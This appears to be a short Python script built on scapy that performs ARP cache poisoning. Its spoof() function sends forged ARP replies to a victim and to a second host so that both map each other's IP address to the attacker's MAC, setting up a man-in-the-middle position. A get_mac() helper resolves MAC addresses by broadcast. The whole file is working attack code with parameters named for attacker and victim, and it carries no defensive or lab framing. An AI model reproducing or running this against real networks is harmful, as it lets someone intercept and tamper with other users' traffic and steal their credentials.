from scapy.all import *

# spoof
def spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, interface):
    arp = Ether() / ARP()
    # arp[Ether].src = mac_attacker
    # arp[Ether].dst = mac_victim
    arp[ARP].hwsrc = mac_attacker
    arp[ARP].psrc = ip_to_spoof
    arp[ARP].hwdst = mac_victim
    arp[ARP].pdst = ip_victim

    # arp.show()

    sendp(arp, iface=interface)

    arp = Ether() / ARP()
    # arp[Ether].src = mac_attacker
    # arp[Ether].dst = mac_victim
    arp[ARP].hwsrc = mac_attacker
    arp[ARP].psrc = ip_victim
    arp[ARP].hwdst = get_mac(ip_to_spoof, interface)
    arp[ARP].pdst = ip_to_spoof

    # arp.show()

    sendp(arp, iface=interface)

def get_mac(ip, interface):
    pakket = Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = ip)
    pakket.show()
    answer, unanswered = srp(pakket, iface=interface, timeout = 1)

    if answer:
        sent, received = answer[0]
        return received.src
    else:
        print('MAC address of ip {ip} not found.'.format(ip=ip))
